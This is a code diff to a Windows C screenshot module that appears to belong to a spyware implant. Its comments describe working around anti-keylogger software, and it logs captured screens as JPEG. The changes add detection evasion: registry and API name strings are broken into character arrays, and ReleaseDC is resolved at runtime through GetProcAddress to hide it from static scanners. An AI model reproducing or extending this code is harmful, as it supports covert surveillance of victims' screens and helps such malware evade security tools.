@@ -20,10 +20,12 @@ BOOL IsAero()
 	HKEY hKey;
 	DWORD composition=0, len=sizeof(DWORD);
 	
-	if(RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\DWM", 0, KEY_READ, &hKey) != ERROR_SUCCESS) 
+	WCHAR strKey[] = { L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'D', L'W', L'M', L'\0' };
+	if(RegOpenKeyEx(HKEY_CURRENT_USER, strKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) 
 		return FALSE;
 
-	if(RegQueryValueExW(hKey, L"Composition", NULL, NULL, (BYTE *)&composition, &len) != ERROR_SUCCESS) 
+	WCHAR strVal[] = { L'C', L'o', L'm', L'p', L'o', L's', L'i', L't', L'i', L'o', L'n', L'\0' };
+	if(RegQueryValueExW(hKey, strVal, NULL, NULL, (BYTE *)&composition, &len) != ERROR_SUCCESS) 
 	{
 		RegCloseKey(hKey);
 		return FALSE;
@@ -63,6 +65,7 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
    }
 
    free(pImageCodecInfo);
+   
    return -1;  // Failure
 }
 
@@ -73,6 +76,7 @@ PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 	void *pBuffer = NULL, *pBufferDst = NULL;
 	IStream *pStream = NULL, *pStreamDst = NULL;
 	BYTE *dataptrDst = NULL;
+	
 	GdiplusStartupInput gdiplusStartupInput;
 	ULONG_PTR gdiplusToken;
 	CLSID   encoderClsid;
@@ -87,8 +91,6 @@ PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 		return NULL;
 	}
 	*sizeDst = 0;
-
-	CoInitialize(NULL);
 	
 	if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) 
 	{
@@ -186,8 +188,6 @@ PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 	GlobalUnlock(hBuffer);
     fpGlobalFree(hBuffer);
 	GdiplusShutdown(gdiplusToken);
-    CoUninitialize();
-	
 	
     return dataptrDst;
 }
@@ -254,10 +254,11 @@ PBYTE TakeScreenshot(PULONG uOut)
 	BOOL is_aero;
 	WINDOWINFO wininfo;
 	int winx, winy;
-	
+	HWND grabwind;
+
 	// Tutto il display. Viene calcolato dalla foreground window
 	// per aggirare AdvancedAntiKeylogger
-	HWND grabwind = GetForegroundWindow();
+	grabwind = GetForegroundWindow();
 	if (!grabwind)
 	{
 #ifdef _DEBUG
@@ -265,24 +266,32 @@ PBYTE TakeScreenshot(PULONG uOut)
 #endif
 		return pScreenShotBuffer;
 	}
-
+	
 	// Se dobbiamo prendere lo schermo intero su Aero prende il DC dello 
+	
 	is_aero = IsAero();
+	
 	if (is_aero) 
 	{
 		g_hScrDC = GetDC(NULL);
 		wininfo.cbSize = sizeof(wininfo);
+		
 		if (!GetWindowInfo(GetDesktopWindow(), &wininfo)) 
 		{
+			CHAR strFuncName[] = { 'R', 'e', 'l', 'e', 'a', 's', 'e', 'D', 'C', '\0' };
+			typedef int (WINAPI *ReleaseDC_p)(HWND, HDC);
+			ReleaseDC_p fpReleaseDC = (ReleaseDC_p) GetProcAddress(GetModuleHandle(L"user32"), strFuncName);
+
 			if (g_hScrDC) 
-				ReleaseDC(NULL, g_hScrDC);
+				fpReleaseDC(NULL, g_hScrDC);
 			return pScreenShotBuffer;
 		}
-	
+		
 		wininfo.rcClient.left = 0;
 		wininfo.rcClient.top = 0;
 		wininfo.rcClient.right = GetSystemMetrics(SM_CXSCREEN);
 		wininfo.rcClient.bottom = GetSystemMetrics(SM_CYSCREEN);
+		
 	} 
 	else
 	{
@@ -296,6 +305,7 @@ PBYTE TakeScreenshot(PULONG uOut)
 		}
 	}
 
+	
 	g_xscdim = GetSystemMetrics(SM_CXSCREEN);
 	g_yscdim = GetSystemMetrics(SM_CYSCREEN);
 	if (wininfo.dwExStyle & WS_EX_LAYOUTRTL) 
@@ -349,12 +359,13 @@ PBYTE TakeScreenshot(PULONG uOut)
 	gdiold = SelectObject(hdccap, hbmcap);
 
 	//BitBlt(hdccap, 0, 0, g_xscdim, g_yscdim, g_hScrDC, -winx, -winy, SRCCOPY);
+
 	StretchBlt(hdccap, x_start, 0, g_xmirr, g_ymirr, g_hScrDC, winx, winy, g_xscdim, g_yscdim, SRCCOPY);
 	if (GetDIBits(hdccap, hbmcap, 0, g_yscdim, (BYTE *)pdwFullBits, (BITMAPINFO *)&bmiHeader, DIB_RGB_COLORS)) 
 	{
 		pScreenShotBuffer = BmpToJpgLog(PM_SCREENSHOT, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50, uOut);
 	}
-
+	
 	// Rilascio oggetti....
 	if (gdiold)
 		DeleteObject(gdiold);
